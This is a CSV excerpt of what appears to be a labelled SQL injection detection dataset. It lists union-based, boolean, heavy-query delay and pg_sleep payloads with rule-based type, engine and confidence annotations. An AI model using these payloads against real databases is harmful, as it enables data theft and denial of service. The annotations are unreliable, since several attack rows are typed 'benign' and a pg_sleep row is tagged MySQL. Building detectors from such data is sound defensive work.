row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3240,"1"" and make_set ( 8403 = 8403,8899 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3241,"-5225' ) ) as zats where 5629 = 5629 union all select 5629,5629,5629,5629,5629--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3242,"-8893%' ) union all select 1254,1254--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3243,"1%"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3244,"-5596' ) ) ) union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3245,"-7238%' or make_set ( 5375 = 9563,9563 ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3246,"-6883"" ) as tbai where 8121 = 8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3247,"1 where 6408 = 6408 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3248,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3249,"1%' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3250,"1"" ) where 4964 = 4964",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3251,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) -- yczq,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
